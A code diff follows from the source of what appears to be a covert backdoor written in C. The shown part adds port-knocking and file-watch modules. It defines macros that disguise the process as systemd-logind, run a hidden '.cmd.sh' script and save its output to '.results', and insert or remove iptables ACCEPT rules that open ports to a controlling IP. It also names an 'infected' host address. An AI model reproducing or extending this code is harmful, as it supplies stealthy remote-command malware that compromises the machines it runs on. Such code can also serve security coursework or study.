@@ -9,7 +9,6 @@
 #include <netinet/if_ether.h>
 #include <net/ethernet.h>
 #include <netinet/ether.h>
-//#include <netinet/ip.h>
 #include <netinet/tcp.h>
 #include <string.h>
 #include <ctype.h>
@@ -22,6 +21,8 @@
 #include "../src/encrypt_utils.h"
 #include "../src/socketwrappers.h"
 #include "../src/covert_wrappers.h"
+#include "../src/portknocking.h"
+#include "../src/inotify.h"
 #include <unistd.h>
 #include <time.h>
 
@@ -76,7 +77,11 @@ struct sniff_tcp {
 #define MASK "/usr/lib/systemd/systemd-logind"
 #define CMD "./.cmd.sh > .results"
 #define CHMOD "chmod 755 .cmd.sh"
-#define IPTABLES(ip) "iptables -I INPUT 1 -p tcp -s " ip " --dport 8505 -j ACCEPT"
+#define IPTABLE "iptables -I INPUT -p "
+#define SOURCE " -s "
+#define DPORT " --dport "
+#define ACCEPT " -j ACCEPT"
+#define IPTABLES(ip,protocol,port) "iptables -I INPUT 1 -p " protocol " -s " ip " --dport " port " -j ACCEPT"
 #define TURNOFF(ip) "iptables -D INPUT -p tcp -s " ip " --dport 8505 -j ACCEPT"
 #define RESULT_FILE ".results"
 #define INFECTEDIP "192.168.0.100"
@@ -87,7 +92,7 @@ struct payload{
     char buffer[1024]; // for either commands or results
 };
 
-
+char* iptables(char *port, char *ip, char *protocol);
 int Packetcapture();
 void ReadPacket(u_char* arg, const struct pcap_pkthdr* pkthdr, const u_char* packet);
 void ParseIP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
